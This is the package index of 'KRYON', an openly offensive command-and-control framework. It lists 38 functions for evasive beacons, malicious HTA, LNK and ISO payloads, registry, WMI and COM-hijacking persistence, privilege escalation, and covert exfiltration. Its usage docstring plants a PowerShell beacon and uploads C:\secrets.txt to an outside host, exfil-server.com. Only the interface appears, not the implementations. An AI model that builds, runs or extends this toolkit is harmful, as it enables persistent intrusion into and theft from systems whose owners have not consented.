"""
KRYON Command & Control - Complete C2 Framework

Multi-protocol C2 infrastructure for post-exploitation operations.

Clearance Level: Omega-Strike (Command & Control Authority)
Mission: Maintain persistent command and control over compromised systems

This package provides:
- C2 server infrastructure (HTTP/HTTPS/DNS)
- Beacon generation with AV evasion
- Payload delivery (HTTP/SMB/DNS/Cloud)
- Persistence mechanisms (Registry/WMI/Service/Scheduled Task)
- Data exfiltration channels (HTTP/DNS/ICMP/Cloud/Email)

Example Usage:
    >>> from skynet.tools.command_and_control import (
    ...     create_c2_server,
    ...     generate_beacon,
    ...     create_payload_server,
    ...     create_registry_persistence,
    ...     exfiltrate_via_http
    ... )
    >>>
    >>> # Start C2 server
    >>> c2 = create_c2_server(protocol="http", port=8080)
    >>>
    >>> # Generate beacon
    >>> beacon = generate_beacon(
    ...     c2_url=c2['c2_url'],
    ...     platform="powershell",
    ...     evasion="advanced"
    ... )
    >>>
    >>> # Setup persistence on target
    >>> persistence = create_registry_persistence(
    ...     payload_path="C:\\\\Windows\\\\Temp\\\\beacon.exe"
    ... )
    >>>
    >>> # Exfiltrate data
    >>> exfil = exfiltrate_via_http(
    ...     file_path="C:\\\\secrets.txt",
    ...     exfil_url="http://exfil-server.com/upload"
    ... )
"""

# C2 Server
# Beacon Generation
from .beacon_generation import (
    generate_beacon,
    generate_payload_variants,
    generate_stager,
    obfuscate_beacon,
)
from .c2_server import (
    create_c2_server,
    download_file_from_beacon,
    execute_module,
    get_session_output,
    get_sessions,
    interactive_shell,
    kill_session,
    send_command,
    stop_c2_server,
    upload_file_to_beacon,
)

# Exfiltration
from .exfiltration import (
    create_covert_timing_channel,
    exfiltrate_via_cloud,
    exfiltrate_via_dns,
    exfiltrate_via_email,
    exfiltrate_via_http,
    exfiltrate_via_icmp,
    exfiltrate_via_steganography,
)

# Payload Delivery
from .payload_delivery import (
    create_dns_payload,
    create_hta_payload,
    create_iso_payload,
    create_lnk_payload,
    create_payload_server,
    create_smb_share,
    create_webdav_share,
    detect_sandbox,
    encode_payload,
)

# Persistence
from .persistence import (
    create_com_hijacking,
    create_dll_hijacking,
    create_registry_persistence,
    create_scheduled_task,
    create_service_persistence,
    create_startup_folder_persistence,
    create_wmi_persistence,
    escalate_privileges,
)

__all__ = [
    # C2 Server (10 functions)
    "create_c2_server",
    "send_command",
    "get_sessions",
    "get_session_output",
    "kill_session",
    "stop_c2_server",
    "interactive_shell",
    "upload_file_to_beacon",
    "download_file_from_beacon",
    "execute_module",
    # Beacon Generation (4 functions)
    "generate_beacon",
    "obfuscate_beacon",
    "generate_stager",
    "generate_payload_variants",
    # Payload Delivery (9 functions)
    "create_payload_server",
    "create_smb_share",
    "create_webdav_share",
    "create_dns_payload",
    "create_hta_payload",
    "create_lnk_payload",
    "create_iso_payload",
    "encode_payload",
    "detect_sandbox",
    # Persistence (8 functions)
    "create_registry_persistence",
    "create_scheduled_task",
    "create_service_persistence",
    "create_startup_folder_persistence",
    "create_wmi_persistence",
    "create_dll_hijacking",
    "create_com_hijacking",
    "escalate_privileges",
    # Exfiltration (7 functions)
    "exfiltrate_via_http",
    "exfiltrate_via_dns",
    "exfiltrate_via_icmp",
    "exfiltrate_via_cloud",
    "exfiltrate_via_email",
    "exfiltrate_via_steganography",
    "create_covert_timing_channel",
]

# Total: 38 command & control functions
